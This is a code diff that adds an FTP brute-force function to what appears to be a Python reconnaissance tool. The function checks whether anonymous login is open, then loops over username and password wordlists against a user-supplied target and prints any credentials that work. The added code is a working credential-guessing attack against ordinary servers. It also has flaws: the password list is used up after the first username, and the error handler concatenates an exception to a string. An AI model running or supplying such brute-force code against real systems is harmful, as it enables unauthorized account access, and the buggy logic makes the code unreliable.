@@ -428,3 +428,60 @@ def dns_ex():
 				print(bold(green('SPF records: ')) + str(spf))
 		except dns.exception.DNSException:
 			print(bad('Query failed > SPF records.'))
+
+def ftp_brute():
+	target = input('Enter IP or domain: ')
+	username = input('Enter USERNAME wordlist: ')
+	password = input('Enter PASSWORD wordlist: ')
+
+	ftp = FTP(target)
+	print()
+	answers = {'230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}
+
+	try:
+		if ftp.login() in answers:
+			print(good('Anonymous login is open.'))
+			print(good('Username: anonymous'))
+			print(good('Password: anonymous@'))
+			ftp.close()
+		else:
+			ftp.close()
+	except:
+		ftp.close()
+		pass
+
+	try:
+		usernames = open(username)
+		passwords = open(password)
+
+		answers = {'230 Anonymous access granted, restrictions apply', '230 Login successfull.', 'Guest login ok, access restrictions apply.', 'User anonymous logged in.'}
+		
+		for user in usernames.readlines():
+			for passw in passwords.readlines():
+				user = user.strip()
+				passw = passw.strip()
+				ftp = FTP(target)
+
+				try:
+					if ftp.login(user, passw) in answers:
+						print()
+						print(good('Success.'))
+						print(good('Username: ' + user))
+						print(good('Password: ' + passw))
+						ftp.close()
+						#break
+					else:
+						print()
+						print(bad('Failed.'))
+						print(bad('Username failed: ' + user))
+						print(bad('Password failed: ' + passw))
+						ftp.close()
+				except Exception as e:
+					print()
+					print(bad('Failed: {}'.format(e)))
+					print(bad('Username failed: ' + user))
+					print(bad('Password failed: ' + passw))
+					ftp.close()
+	except Exception as e:
+		print(bad('Bruteforce failed: ' + e))
+		ftp.quit()
